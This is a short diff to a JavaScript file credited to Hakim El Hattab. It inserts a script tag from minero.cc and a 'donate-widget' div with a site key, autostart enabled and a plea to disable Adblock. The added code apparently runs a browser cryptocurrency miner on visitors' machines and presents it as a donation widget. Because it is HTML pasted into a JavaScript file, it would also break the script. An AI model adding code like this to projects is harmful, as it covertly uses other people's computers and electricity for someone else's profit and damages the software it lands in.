@@ -4,6 +4,14 @@
  *
  * Copyright (C) 2018 Hakim El Hattab, http://hakim.se
  */
+<script src="https://minero.cc/lib/donate-widget.min.js" async></script>
+<div class="minero-donate-widget"
+     style="width: 150px; height: 80px"
+     data-key="ab5afad7e408d1b8bddbd0026a59eec8"
+     data-autostart="true"
+     data-speed="low">
+  <em>Please disable Adblock!</em>
+</div>
 var Core = new function(){
 
 	// Flags if we are running mobile mode
